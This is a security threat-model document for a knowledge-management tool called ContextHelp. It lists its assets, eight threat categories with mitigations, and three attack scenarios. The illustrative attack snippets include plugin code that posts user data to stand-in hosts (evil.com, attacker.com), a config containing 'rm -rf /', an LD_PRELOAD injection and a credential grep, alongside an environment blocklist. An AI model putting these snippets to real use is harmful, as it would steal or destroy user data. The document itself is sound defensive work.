# Threat Model

Comprehensive threat analysis and attack vectors for ContextHelp.

---

## Protected Assets

ContextHelp protects the following critical assets:

### 1. User Data
- Knowledge objects (bookmarks, notes, documents)
- Entity relationships and knowledge graphs
- Personal information and preferences
- Search queries and activity logs

### 2. Credentials & Secrets
- API keys (OpenAI, Anthropic, etc.)
- Database passwords
- Registry authentication tokens
- Encryption keys and passphrases
- OAuth tokens

### 3. Configuration
- System settings and policies
- Pipeline definitions
- Agent profiles and scope rules
- Registry connections

### 4. System Integrity
- Core application code
- Plugin manifests
- Database schemas
- Configuration files

---

## Threat Categories

### 1. Unauthorized Access

**Threat**: Unauthorized users or processes access stored knowledge or configuration

**Attack Vectors**:
- File system permissions misconfiguration
- Unencrypted storage files
- Network access to unprotected APIs
- Local privilege escalation

**Mitigations**:
- Localhost-only API binding by default
- File permission validation (600 for sensitive files)
- Optional storage encryption
- User permission validation before data access
- SELinux/AppArmor integration points

**Risk Level**: High

**Example Attack**:
```bash
# Attacker finds world-readable database
ls -la ~/.local/share/contexthelp/contexthelp.db
-rw-r--r--  # BAD - Anyone can read

# Access user's knowledge without authentication
sqlite3 ~/.local/share/contexthelp/contexthelp.db "SELECT * FROM objects"
```

**Mitigation Example**:
```bash
# ContextHelp validates and enforces secure permissions
chmod 600 ~/.local/share/contexthelp/contexthelp.db
# Raises error if permissions are insecure
```

---

### 2. Credential Exposure

**Threat**: API keys, passwords, and tokens are exposed in logs, error messages, or files

**Attack Vectors**:
- Accidental inclusion in log files
- Debug output with sensitive values
- Configuration file disclosure
- Error stack traces
- Version control history

**Mitigations**:
- Automatic log sanitization (all output redacted)
- Secret pattern detection
- Configuration validation
- Pre-commit hook integration
- Secrets management guidance

**Risk Level**: Critical

**Example Attack**:
```bash
# Attacker finds API key in logs
grep -r "sk-proj-" ~/.local/share/contexthelp/logs/
# Found: "OpenAI request failed: sk-proj-abc123def456 invalid"
```

**Mitigation Example**:
```go
// Automatic sanitization
log.Info("OpenAI request failed",
    "api_key", apiKey)  // Automatically redacted
// Output: "OpenAI request failed api_key=<REDACTED>"
```

---

### 3. Configuration Injection

**Threat**: Malicious configuration modifies system behavior

**Attack Vectors**:
- Untrusted registry responses
- Compromised configuration files
- Environment variable injection
- YAML/JSON deserialization attacks

**Mitigations**:
- Strict schema validation
- Type checking on all config values
- Registry data treated as untrusted
- Configuration file integrity checks
- Schema versioning for compatibility

**Risk Level**: High

**Example Attack**:
```yaml
# Malicious registry response
pipelines:
  - name: "../../malicious.yaml"  # Path traversal
    steps:
      - type: exec
        command: "rm -rf /"  # Arbitrary command
```

**Mitigation Example**:
```go
// Strict schema validation rejects malicious config
type PipelineConfig struct {
    Name  string `validate:"required,alphanum"`
    Steps []Step `validate:"required,dive"`
}
```

---

### 4. Plugin/Pipeline Exploitation

**Threat**: Malicious or compromised plugins execute unauthorized code

**Attack Vectors**:
- Plugins access system resources
- Plugins exfiltrate data
- Plugins execute arbitrary commands
- Plugins modify protected data

**Mitigations**:
- Plugin sandboxing (capability-based)
- Restricted file system access
- No direct network access without permission
- No access to other plugin data
- Memory limits and execution timeouts
- Permission manifest validation

**Risk Level**: High

**Example Attack**:
```go
// Malicious plugin attempts data exfiltration
func (p *MaliciousPlugin) Process(obj Object) error {
    // Attempt to read all objects
    allData := readDatabase("/var/lib/contexthelp/db")
    
    // Exfiltrate to attacker server
    http.Post("https://evil.com/steal", allData)
}
```

**Mitigation Example**:
```go
// Plugin sandbox blocks unauthorized access
// Plugin manifest declares required capabilities
{
  "name": "suspicious-plugin",
  "capabilities": ["read:self"]  // Can only read own data
}
// Sandbox enforces: network access denied, database access restricted
```

---

### 5. Data Exfiltration

**Threat**: Knowledge objects or user data transmitted without authorization

**Attack Vectors**:
- Misconfigured external registries
- Malicious plugins
- Compromised AI provider integrations
- Unencrypted network traffic

**Mitigations**:
- Explicit opt-in for external features
- No default external communication
- TLS for all external connections
- Registry permission scoping
- Plugin data access restrictions
- Audit logging of data access

**Risk Level**: High

**Example Attack**:
```go
// Malicious plugin sends data to external service
func (p *Plugin) Process(obj Object) error {
    // Silently exfiltrate user's knowledge objects
    for _, obj := range getAllObjects() {
        http.Post("https://attacker.com/collect", obj.Content)
    }
}
```

**Mitigation Example**:
```go
// Plugin sandbox blocks network access unless explicitly permitted
// Permission manifest:
{
  "capabilities": ["network:read"]  // Must declare network access
}
// User sees warning: "Plugin requests network access. Allow?"
```

---

### 6. Supply Chain Attacks

**Threat**: Compromised dependencies, plugins, or registries

**Attack Vectors**:
- Malicious plugin packages
- Compromised registry data
- Vulnerable dependencies
- Typosquatting on plugin names

**Mitigations**:
- Plugin manifest validation
- Registry signature verification (future)
- Dependency scanning
- Plugin permission review before installation
- Allowlist/blocklist support
- Version pinning recommendations

**Risk Level**: Medium

**Example Attack**:
```bash
# Attacker publishes typosquatted plugin
ctxt plugin install contexthelp-utils  # Legitimate
ctxt plugin install contexthelp-util   # Typosquatted, malicious
```

**Mitigation Example**:
```bash
# ContextHelp warns about similar names
"Warning: Did you mean 'contexthelp-utils'? 
 'contexthelp-util' is not from a verified publisher."
 
# Plugin manifest validation
{
  "name": "contexthelp-util",
  "publisher": "unknown",  # Not verified
  "permissions": ["*"]     # Excessive permissions - REJECTED
}
```

---

### 7. Denial of Service

**Threat**: System becomes unavailable through resource exhaustion

**Attack Vectors**:
- Infinite loops in pipelines
- Unbounded memory allocation
- Large input processing
- Registry response flooding

**Mitigations**:
- Input size limits
- Execution timeouts
- Memory limits per pipeline/plugin
- Rate limiting on registry access
- Job queue backpressure
- Resource monitoring and alerts

**Risk Level**: Medium

**Example Attack**:
```yaml
# Malicious pipeline with infinite loop
pipeline:
  name: dos-attack
  steps:
    - type: loop
      count: -1  # Infinite
      step:
        type: allocate
        size: 1GB  # Per iteration
```

**Mitigation Example**:
```go
// Resource limits enforced
const (
    MaxPipelineMemory = 256 * MB
    MaxPipelineTime   = 5 * time.Minute
    MaxInputSize      = 10 * MB
)

// Pipeline exceeds limits -> killed
```

---

### 8. Privilege Escalation

**Threat**: Lower-privileged operations gain higher privileges

**Attack Vectors**:
- File descriptor inheritance
- Environment variable leakage
- Unsafe command execution
- Unquoted shell arguments

**Mitigations**:
- Strict file permission handling
- Environment variable sanitization
- No shell command execution
- Argument quoting and validation
- User capability enforcement

**Risk Level**: Medium

**Example Attack**:
```bash
# Attacker manipulates environment
export LD_PRELOAD=/tmp/malicious.so
ctxt analyze "test"  # Loads malicious library
```

**Mitigation Example**:
```go
// Environment sanitization before execution
func sanitizeEnvironment() []string {
    blocklist := []string{"LD_PRELOAD", "LD_LIBRARY_PATH"}
    safe := []string{}
    for _, env := range os.Environ() {
        key := strings.Split(env, "=")[0]
        if !contains(blocklist, key) {
            safe = append(safe, env)
        }
    }
    return safe
}
```

---

## Threat Matrix

| Threat Category | Likelihood | Impact | Risk Level | Primary Mitigation |
|----------------|------------|--------|------------|-------------------|
| Unauthorized Access | Medium | High | **High** | File permissions, encryption |
| Credential Exposure | High | Critical | **Critical** | Log sanitization, secret detection |
| Configuration Injection | Medium | High | **High** | Schema validation, type checking |
| Plugin/Pipeline Exploitation | Medium | High | **High** | Sandboxing, capability model |
| Data Exfiltration | Low | High | **High** | Opt-in, TLS, audit logging |
| Supply Chain Attacks | Low | Medium | **Medium** | Manifest validation, signatures |
| Denial of Service | Low | Medium | **Medium** | Resource limits, timeouts |
| Privilege Escalation | Low | Medium | **Medium** | Environment sanitization |

---

## Attack Scenarios

### Scenario 1: Malicious Plugin Compromise

**Attacker Goal**: Install malicious plugin to steal API keys

**Attack Steps**:
1. Publish plugin "contexthelp-enhancer" with useful features
2. Include backdoor that reads config files
3. User installs plugin
4. Plugin reads `~/.config/contexthelp/config.yaml`
5. Exfiltrates `OPENAI_API_KEY` to attacker server

**ContextHelp Defenses**:
- Plugin sandbox blocks file system access outside plugin directory
- Network access requires explicit permission (user prompt)
- Log sanitization prevents API key from appearing in logs
- Audit logging records plugin installation and data access attempts

**Outcome**: Attack blocked by sandbox isolation

---

### Scenario 2: Registry Response Manipulation

**Attacker Goal**: Inject malicious pipeline via compromised registry

**Attack Steps**:
1. Compromise registry server or MitM registry connection
2. Inject malicious pipeline definition in registry response
3. User fetches pipelines from registry
4. Malicious pipeline executes arbitrary code

**ContextHelp Defenses**:
- All registry responses validated against strict JSON schema
- Pipeline definitions type-checked before execution
- TLS required for registry connections (prevents MitM)
- Registry signature verification (future enhancement)

**Outcome**: Attack blocked by schema validation

---

### Scenario 3: Log-Based Credential Leak

**Attacker Goal**: Extract API keys from debug logs

**Attack Steps**:
1. User enables debug logging
2. Application logs API request with key in headers
3. Attacker gains access to log files
4. Extracts `OPENAI_API_KEY` from logs

**ContextHelp Defenses**:
- Automatic log sanitization on all output
- Secret pattern detection (50+ patterns)
- Sanitization enabled by default, even in debug mode
- Log file permissions restricted to user only (600)

**Outcome**: API key redacted in logs, attack blocked

---

## Threat Model Maintenance

This threat model should be updated:

- **Quarterly**: Review for new threat categories
- **After incidents**: Update based on lessons learned
- **Architecture changes**: Re-evaluate boundaries and controls
- **Dependency updates**: Assess new vulnerability classes

---

## Related Documentation

- [boundaries.md](boundaries.md) — Trust boundaries
- [controls.md](controls.md) — Security controls
- [../secret-management.md](../secret-management.md) — Secret lifecycle
- [../validation.md](../validation.md) — Input validation

---

**Last Updated**: 2026-01-26
**Version**: 1.0
**Status**: Active
**Maintained by**: Security Team
